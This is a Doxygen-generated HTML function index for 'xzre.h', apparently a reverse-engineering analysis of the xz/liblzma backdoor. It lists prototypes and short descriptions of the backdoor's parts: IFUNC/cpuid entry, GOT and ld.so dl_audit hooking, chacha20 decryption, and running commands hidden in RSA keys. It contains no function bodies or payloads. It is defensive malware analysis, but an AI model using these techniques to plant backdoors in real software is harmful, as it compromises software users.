<tr class="memitem:acb54dcbcba1c88075c523678a0d0dbda"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#acb54dcbcba1c88075c523678a0d0dbda">elf_get_got_symbol</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId encoded_string_id)</td></tr>
<tr class="memdesc:acb54dcbcba1c88075c523678a0d0dbda"><td class="mdescLeft">&#160;</td><td class="mdescRight">Gets the GOT symbol with name <code>encoded_string_id</code> from the parsed ELF file.  <a href="xzre_8h.html#acb54dcbcba1c88075c523678a0d0dbda">More...</a><br /></td></tr>
<tr class="separator:acb54dcbcba1c88075c523678a0d0dbda"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa71724f34c91861ce2211d9622e41972"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aa71724f34c91861ce2211d9622e41972">elf_find_function_pointer</a> (StringXrefId xref_id, void **pOutCodeStart, void **pOutCodeEnd, void **pOutFptrAddr, <a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, <a class="el" href="structstring__references.html">string_references_t</a> *xrefs, BOOL *pCheckPrologue)</td></tr>
<tr class="memdesc:aa71724f34c91861ce2211d9622e41972"><td class="mdescLeft">&#160;</td><td class="mdescRight">this function searches for a function pointer, pointing to a function designated by the given <code>xref_id</code>  <a href="xzre_8h.html#aa71724f34c91861ce2211d9622e41972">More...</a><br /></td></tr>
<tr class="separator:aa71724f34c91861ce2211d9622e41972"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad86c0039d3a08468f5cf7187662ebab9"><td class="memItemLeft" align="right" valign="top">char *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ad86c0039d3a08468f5cf7187662ebab9">elf_find_string</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId *stringId_inOut, void *rodata_start_ptr)</td></tr>
<tr class="memdesc:ad86c0039d3a08468f5cf7187662ebab9"><td class="mdescLeft">&#160;</td><td class="mdescRight">Locates a string in the ELF .rodata section.  <a href="xzre_8h.html#ad86c0039d3a08468f5cf7187662ebab9">More...</a><br /></td></tr>
<tr class="separator:ad86c0039d3a08468f5cf7187662ebab9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abc618a02e31b94194ce03b0c4a2b3597"><td class="memItemLeft" align="right" valign="top">lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#abc618a02e31b94194ce03b0c4a2b3597">get_lzma_allocator</a> ()</td></tr>
<tr class="memdesc:abc618a02e31b94194ce03b0c4a2b3597"><td class="mdescLeft">&#160;</td><td class="mdescRight">gets the fake LZMA allocator, used for imports resolution the "opaque" field of the structure holds a pointer to  <a href="xzre_8h.html#abc618a02e31b94194ce03b0c4a2b3597">More...</a><br /></td></tr>
<tr class="separator:abc618a02e31b94194ce03b0c4a2b3597"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a45b23f67e591074c22a0691a6b5aced5"><td class="memItemLeft" align="right" valign="top"><a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a> *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a45b23f67e591074c22a0691a6b5aced5">get_lzma_allocator_address</a> ()</td></tr>
<tr class="memdesc:a45b23f67e591074c22a0691a6b5aced5"><td class="mdescLeft">&#160;</td><td class="mdescRight">gets the address of the fake LZMA allocator  <a href="xzre_8h.html#a45b23f67e591074c22a0691a6b5aced5">More...</a><br /></td></tr>
<tr class="separator:a45b23f67e591074c22a0691a6b5aced5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aeb6b7e7363a9d706fdd3704ef5faf584"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584">fake_lzma_alloc</a> (void *opaque, size_t nmemb, size_t size)</td></tr>
<tr class="memdesc:aeb6b7e7363a9d706fdd3704ef5faf584"><td class="mdescLeft">&#160;</td><td class="mdescRight">a fake alloc function called by lzma_alloc() that then calls <a class="el" href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109" title="Looks up an ELF symbol from a parsed ELF, and returns its memory address.">elf_symbol_get_addr()</a>  <a href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584">More...</a><br /></td></tr>
<tr class="separator:aeb6b7e7363a9d706fdd3704ef5faf584"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5565761b59b3ef6786b83a9b50f72b17"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a5565761b59b3ef6786b83a9b50f72b17">fake_lzma_free</a> (void *opaque, void *ptr)</td></tr>
<tr class="memdesc:a5565761b59b3ef6786b83a9b50f72b17"><td class="mdescLeft">&#160;</td><td class="mdescRight">a fake free function called by lzma_free()  <a href="xzre_8h.html#a5565761b59b3ef6786b83a9b50f72b17">More...</a><br /></td></tr>
<tr class="separator:a5565761b59b3ef6786b83a9b50f72b17"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa3c963b13e204d9d99ab57a5647e9b45"><td class="memItemLeft" align="right" valign="top"><a class="el" href="structelf__functions.html">elf_functions_t</a> *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aa3c963b13e204d9d99ab57a5647e9b45">get_elf_functions_address</a> ()</td></tr>
<tr class="memdesc:aa3c963b13e204d9d99ab57a5647e9b45"><td class="mdescLeft">&#160;</td><td class="mdescRight">gets the address of the <a class="el" href="structelf__functions.html">elf_functions</a>  <a href="xzre_8h.html#aa3c963b13e204d9d99ab57a5647e9b45">More...</a><br /></td></tr>
<tr class="separator:aa3c963b13e204d9d99ab57a5647e9b45"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4faeea5b6941bead3c1a355a4ae12dc7"><td class="memItemLeft" align="right" valign="top"><a id="a4faeea5b6941bead3c1a355a4ae12dc7"></a>
BOOL&#160;</td><td class="memItemRight" valign="bottom"><b>secret_data_append_from_instruction</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx, <a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> *cursor)</td></tr>
<tr class="separator:a4faeea5b6941bead3c1a355a4ae12dc7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad595372eac746eb11ddc536e5a20d667"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ad595372eac746eb11ddc536e5a20d667">secret_data_append_from_code</a> (void *code_start, void *code_end, <a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> shift_cursor, unsigned shift_count, BOOL start_from_call)</td></tr>
<tr class="memdesc:ad595372eac746eb11ddc536e5a20d667"><td class="mdescLeft">&#160;</td><td class="mdescRight">Pushes secret data by validating the given code block.  <a href="xzre_8h.html#ad595372eac746eb11ddc536e5a20d667">More...</a><br /></td></tr>
<tr class="separator:ad595372eac746eb11ddc536e5a20d667"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9549ca2df0051496f162616f98bac754"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a9549ca2df0051496f162616f98bac754">secret_data_append_if_flags</a> (<a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> shift_cursor, unsigned operation_index, unsigned shift_count, int flags, u8 *code)</td></tr>
<tr class="memdesc:a9549ca2df0051496f162616f98bac754"><td class="mdescLeft">&#160;</td><td class="mdescRight">Calls <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a>, if <code>flags</code> are non-zero.  <a href="xzre_8h.html#a9549ca2df0051496f162616f98bac754">More...</a><br /></td></tr>
<tr class="separator:a9549ca2df0051496f162616f98bac754"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa7239c834d2598747c9158949280783b"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aa7239c834d2598747c9158949280783b">secret_data_append_from_address</a> (void *addr, <a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> shift_cursor, unsigned shift_count, unsigned operation_index)</td></tr>
<tr class="memdesc:aa7239c834d2598747c9158949280783b"><td class="mdescLeft">&#160;</td><td class="mdescRight">calls <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a> with either the given code address or the return address, if <code>addr</code> is &lt;= 1  <a href="xzre_8h.html#aa7239c834d2598747c9158949280783b">More...</a><br /></td></tr>
<tr class="separator:aa7239c834d2598747c9158949280783b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a48636f910a9c7df2f2adfa4abf7a73e9"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a> (u8 *call_site, u8 *code, <a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> shift_cursor, unsigned shift_count, unsigned operation_index)</td></tr>
<tr class="memdesc:a48636f910a9c7df2f2adfa4abf7a73e9"><td class="mdescLeft">&#160;</td><td class="mdescRight">Shifts data in the secret data store, after validation of <code>code</code>. this function is intended to be invoked only once for each <code>operation_index</code> value. <code>operation_index</code> will be used as an index into a global array of flags, so that multiple calls with the same value will be a NO-OP.  <a href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">More...</a><br /></td></tr>
<tr class="separator:a48636f910a9c7df2f2adfa4abf7a73e9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ace528f88c27d645eafff5052f6c36bd0"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ace528f88c27d645eafff5052f6c36bd0">secret_data_append_from_call_site</a> (<a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a> shift_cursor, unsigned shift_count, unsigned operation_index, BOOL bypass)</td></tr>
<tr class="memdesc:ace528f88c27d645eafff5052f6c36bd0"><td class="mdescLeft">&#160;</td><td class="mdescRight">Shifts data in the secret data store, after validation of the call site, i.e. the caller of this function for more details, see <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a>.  <a href="xzre_8h.html#ace528f88c27d645eafff5052f6c36bd0">More...</a><br /></td></tr>
<tr class="separator:ace528f88c27d645eafff5052f6c36bd0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a229ee0bd4111363061bc4230bc1f6423"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">backdoor_setup</a> (<a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params_t</a> *params)</td></tr>
<tr class="memdesc:a229ee0bd4111363061bc4230bc1f6423"><td class="mdescLeft">&#160;</td><td class="mdescRight">the backdoor main method  <a href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">More...</a><br /></td></tr>
<tr class="separator:a229ee0bd4111363061bc4230bc1f6423"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a851b6ae19abb6961d0c6c21f382e0abc"><td class="memItemLeft" align="right" valign="top">unsigned int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a851b6ae19abb6961d0c6c21f382e0abc">backdoor_entry</a> (unsigned int cpuid_request, u64 *caller_frame)</td></tr>
<tr class="memdesc:a851b6ae19abb6961d0c6c21f382e0abc"><td class="mdescLeft">&#160;</td><td class="mdescRight">calls <a class="el" href="xzre_8h.html#a247a9d52e67096a060b99f0eb6dd4ca6">backdoor_init</a> while in the crc64() IFUNC resolver function  <a href="xzre_8h.html#a851b6ae19abb6961d0c6c21f382e0abc">More...</a><br /></td></tr>
<tr class="separator:a851b6ae19abb6961d0c6c21f382e0abc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a247a9d52e67096a060b99f0eb6dd4ca6"><td class="memItemLeft" align="right" valign="top">unsigned int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a247a9d52e67096a060b99f0eb6dd4ca6">backdoor_init</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *state, u64 *caller_frame)</td></tr>
<tr class="memdesc:a247a9d52e67096a060b99f0eb6dd4ca6"><td class="mdescLeft">&#160;</td><td class="mdescRight">calls <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2</a> by disguising it as a call to cpuid.  <a href="xzre_8h.html#a247a9d52e67096a060b99f0eb6dd4ca6">More...</a><br /></td></tr>
<tr class="separator:a247a9d52e67096a060b99f0eb6dd4ca6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abf19222b4917f772ad487a2970dd51ec"><td class="memItemLeft" align="right" valign="top">ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#abf19222b4917f772ad487a2970dd51ec">init_elf_entry_ctx</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *ctx)</td></tr>
<tr class="memdesc:abf19222b4917f772ad487a2970dd51ec"><td class="mdescLeft">&#160;</td><td class="mdescRight">initialises the elf_entry_ctx_t  <a href="xzre_8h.html#abf19222b4917f772ad487a2970dd51ec">More...</a><br /></td></tr>
<tr class="separator:abf19222b4917f772ad487a2970dd51ec"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad33792d2db40b95a7b434081d1608ca4"><td class="memItemLeft" align="right" valign="top">ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ad33792d2db40b95a7b434081d1608ca4">get_got_offset</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *ctx)</td></tr>
<tr class="memdesc:ad33792d2db40b95a7b434081d1608ca4"><td class="mdescLeft">&#160;</td><td class="mdescRight">get the offset to the GOT  <a href="xzre_8h.html#ad33792d2db40b95a7b434081d1608ca4">More...</a><br /></td></tr>
<tr class="separator:ad33792d2db40b95a7b434081d1608ca4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aee7738c9cab5f6733c666e0a20e5ba99"><td class="memItemLeft" align="right" valign="top">u64&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99">get_cpuid_got_index</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *ctx)</td></tr>
<tr class="memdesc:aee7738c9cab5f6733c666e0a20e5ba99"><td class="mdescLeft">&#160;</td><td class="mdescRight">get the cpuid() GOT index  <a href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99">More...</a><br /></td></tr>
<tr class="separator:aee7738c9cab5f6733c666e0a20e5ba99"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8ab85586c2cbdd03ee2f734b92e3e3d6"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *ctx, u64 *caller_frame, void **cpuid_got_addr, <a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a> *reloc_consts)</td></tr>
<tr class="separator:a8ab85586c2cbdd03ee2f734b92e3e3d6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0d70747b6216270de07c783fc499938e"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a0d70747b6216270de07c783fc499938e">resolve_libc_imports</a> (struct link_map *libc, <a class="el" href="structelf__info.html">elf_info_t</a> *libc_info, <a class="el" href="structlibc__imports.html">libc_imports_t</a> *imports)</td></tr>
<tr class="memdesc:a0d70747b6216270de07c783fc499938e"><td class="mdescLeft">&#160;</td><td class="mdescRight">parses the libc ELF from the supplied link map, and resolves its imports  <a href="xzre_8h.html#a0d70747b6216270de07c783fc499938e">More...</a><br /></td></tr>
<tr class="separator:a0d70747b6216270de07c783fc499938e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1cb8bb283baa56567d7b88b5fcfe7db7"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a1cb8bb283baa56567d7b88b5fcfe7db7">process_shared_libraries</a> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a> *data)</td></tr>
<tr class="memdesc:a1cb8bb283baa56567d7b88b5fcfe7db7"><td class="mdescLeft">&#160;</td><td class="mdescRight">scans loaded libraries to identify interesting libraries  <a href="xzre_8h.html#a1cb8bb283baa56567d7b88b5fcfe7db7">More...</a><br /></td></tr>
<tr class="separator:a1cb8bb283baa56567d7b88b5fcfe7db7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1fcba1b3d069ccf76ee3cef4a3b9a682"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a1fcba1b3d069ccf76ee3cef4a3b9a682">process_shared_libraries_map</a> (struct link_map *r_map, <a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a> *data)</td></tr>
<tr class="memdesc:a1fcba1b3d069ccf76ee3cef4a3b9a682"><td class="mdescLeft">&#160;</td><td class="mdescRight">scans loaded libraries to identify interesting libraries and populate related data  <a href="xzre_8h.html#a1fcba1b3d069ccf76ee3cef4a3b9a682">More...</a><br /></td></tr>
<tr class="separator:a1fcba1b3d069ccf76ee3cef4a3b9a682"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8eb41e1828a73dd4ce8f82a0d42dceb5"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8eb41e1828a73dd4ce8f82a0d42dceb5">chacha_decrypt</a> (u8 *in, int inl, u8 *key, u8 *iv, u8 *out, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *funcs)</td></tr>
<tr class="memdesc:a8eb41e1828a73dd4ce8f82a0d42dceb5"><td class="mdescLeft">&#160;</td><td class="mdescRight">decrypts a buffer with chacha20  <a href="xzre_8h.html#a8eb41e1828a73dd4ce8f82a0d42dceb5">More...</a><br /></td></tr>
<tr class="separator:a8eb41e1828a73dd4ce8f82a0d42dceb5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a80592f231ad06e5a8ba204e6ff685827"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a80592f231ad06e5a8ba204e6ff685827">secret_data_get_decrypted</a> (u8 *output, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a80592f231ad06e5a8ba204e6ff685827"><td class="mdescLeft">&#160;</td><td class="mdescRight">obtains a decrypted copy of the secret data  <a href="xzre_8h.html#a80592f231ad06e5a8ba204e6ff685827">More...</a><br /></td></tr>
<tr class="separator:a80592f231ad06e5a8ba204e6ff685827"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2cbf38048a3510f1632b4060b2a0a63f"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a2cbf38048a3510f1632b4060b2a0a63f">is_range_mapped</a> (u8 *addr, u8 length, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a2cbf38048a3510f1632b4060b2a0a63f"><td class="mdescLeft">&#160;</td><td class="mdescRight">verify if a memory range is mapped  <a href="xzre_8h.html#a2cbf38048a3510f1632b4060b2a0a63f">More...</a><br /></td></tr>
<tr class="separator:a2cbf38048a3510f1632b4060b2a0a63f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9ec1df74592643b26839ecbe320d36ae"><td class="memItemLeft" align="right" valign="top">u32&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a9ec1df74592643b26839ecbe320d36ae">count_bits</a> (u64 x)</td></tr>
<tr class="memdesc:a9ec1df74592643b26839ecbe320d36ae"><td class="mdescLeft">&#160;</td><td class="mdescRight">returns the number of 1 bits in x  <a href="xzre_8h.html#a9ec1df74592643b26839ecbe320d36ae">More...</a><br /></td></tr>
<tr class="separator:a9ec1df74592643b26839ecbe320d36ae"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6189320317764e3344934873b58b30b1"><td class="memItemLeft" align="right" valign="top">EncodedStringId&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6189320317764e3344934873b58b30b1">get_string_id</a> (const char *string_begin, const char *string_end)</td></tr>
<tr class="memdesc:a6189320317764e3344934873b58b30b1"><td class="mdescLeft">&#160;</td><td class="mdescRight">Get the.  <a href="xzre_8h.html#a6189320317764e3344934873b58b30b1">More...</a><br /></td></tr>
<tr class="separator:a6189320317764e3344934873b58b30b1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a954b1d109f7b7576c4d904a1ef5de2c9"><td class="memItemLeft" align="right" valign="top">unsigned int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a954b1d109f7b7576c4d904a1ef5de2c9">_get_cpuid_modified</a> (unsigned int leaf, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx, u64 *caller_frame)</td></tr>
<tr class="memdesc:a954b1d109f7b7576c4d904a1ef5de2c9"><td class="mdescLeft">&#160;</td><td class="mdescRight">the backdoor entrypoint function, called by the IFUNC resolver for liblzma crc32() and crc64()  <a href="xzre_8h.html#a954b1d109f7b7576c4d904a1ef5de2c9">More...</a><br /></td></tr>
<tr class="separator:a954b1d109f7b7576c4d904a1ef5de2c9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a93ca9203c23a4ab6b11ad972e77d6d80"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a93ca9203c23a4ab6b11ad972e77d6d80">_cpuid_gcc</a> (unsigned int level, unsigned int *a, unsigned int *b, unsigned int *c, unsigned int *d)</td></tr>
<tr class="memdesc:a93ca9203c23a4ab6b11ad972e77d6d80"><td class="mdescLeft">&#160;</td><td class="mdescRight">actually calls cpuid instruction  <a href="xzre_8h.html#a93ca9203c23a4ab6b11ad972e77d6d80">More...</a><br /></td></tr>
<tr class="separator:a93ca9203c23a4ab6b11ad972e77d6d80"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abbcfd61778019372e0cabdf79b98824d"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#abbcfd61778019372e0cabdf79b98824d">init_hook_functions</a> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a> *funcs)</td></tr>
<tr class="memdesc:abbcfd61778019372e0cabdf79b98824d"><td class="mdescLeft">&#160;</td><td class="mdescRight">Initializes the structure with hooks-related data.  <a href="xzre_8h.html#abbcfd61778019372e0cabdf79b98824d">More...</a><br /></td></tr>
<tr class="separator:abbcfd61778019372e0cabdf79b98824d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad3a61f27a1663eb3e0b25b861c85fe3c"><td class="memItemLeft" align="right" valign="top">void *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c">update_got_address</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *entry_ctx)</td></tr>
<tr class="memdesc:ad3a61f27a1663eb3e0b25b861c85fe3c"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds the __tls_get_addr() GOT entry  <a href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c">More...</a><br /></td></tr>
<tr class="separator:ad3a61f27a1663eb3e0b25b861c85fe3c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae20580c7a069afb3b578f060582867df"><td class="memItemLeft" align="right" valign="top">ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df">get_tls_get_addr_random_symbol_got_offset</a> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *ctx)</td></tr>
<tr class="memdesc:ae20580c7a069afb3b578f060582867df"><td class="mdescLeft">&#160;</td><td class="mdescRight">get the tls_get_addr_random_symbol GOT offset  <a href="xzre_8h.html#ae20580c7a069afb3b578f060582867df">More...</a><br /></td></tr>
<tr class="separator:ae20580c7a069afb3b578f060582867df"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a60ba9b591b9f0b10a78ea2136a0a3adc"><td class="memItemLeft" align="right" valign="top">uintptr_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc">backdoor_symbind64</a> (Elf64_Sym *sym, unsigned int ndx, uptr *refcook, uptr *defcook, unsigned int flags, const char *symname)</td></tr>
<tr class="memdesc:a60ba9b591b9f0b10a78ea2136a0a3adc"><td class="mdescLeft">&#160;</td><td class="mdescRight">the backdoored symbind64 installed in GLRO(dl_audit)  <a href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc">More...</a><br /></td></tr>
<tr class="separator:a60ba9b591b9f0b10a78ea2136a0a3adc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:add930f2364d6ac0711ec484781f00f03"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#add930f2364d6ac0711ec484781f00f03">run_backdoor_commands</a> (RSA *key, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx, BOOL *do_orig)</td></tr>
<tr class="memdesc:add930f2364d6ac0711ec484781f00f03"><td class="mdescLeft">&#160;</td><td class="mdescRight">checks if the supplied RSA public key contains the backdoor commands, and executes them if present.  <a href="xzre_8h.html#add930f2364d6ac0711ec484781f00f03">More...</a><br /></td></tr>
<tr class="separator:add930f2364d6ac0711ec484781f00f03"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8847a8cb7f015796a8fbd59cb7a18248"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a8847a8cb7f015796a8fbd59cb7a18248">find_dl_audit_offsets</a> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *data, ptrdiff_t *libname_offset, <a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *hooks, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *<a class="el" href="structimported__funcs.html">imported_funcs</a>)</td></tr>
<tr class="memdesc:a8847a8cb7f015796a8fbd59cb7a18248"><td class="mdescLeft">&#160;</td><td class="mdescRight">Find the various offsets in ld.so that need modification to trigger _dl_audit_symbind_alt() to call <a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc" title="the backdoored symbind64 installed in GLRO(dl_audit)">backdoor_symbind64()</a>.  <a href="xzre_8h.html#a8847a8cb7f015796a8fbd59cb7a18248">More...</a><br /></td></tr>
<tr class="separator:a8847a8cb7f015796a8fbd59cb7a18248"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a17824cde912b4de5dd68530dcbf9d42c"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a17824cde912b4de5dd68530dcbf9d42c">find_link_map_l_name</a> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a> *data_handle, ptrdiff_t *libname_offset, <a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a> *hooks, <a class="el" href="structimported__funcs.html">imported_funcs_t</a> *<a class="el" href="structimported__funcs.html">imported_funcs</a>)</td></tr>
<tr class="memdesc:a17824cde912b4de5dd68530dcbf9d42c"><td class="mdescLeft">&#160;</td><td class="mdescRight">Find struct link_map offsets required to modify ld.so's private struct auditstate state.  <a href="xzre_8h.html#a17824cde912b4de5dd68530dcbf9d42c">More...</a><br /></td></tr>
<tr class="separator:a17824cde912b4de5dd68530dcbf9d42c"><td class="memSeparator" colspan="2">&#160;</td></tr>
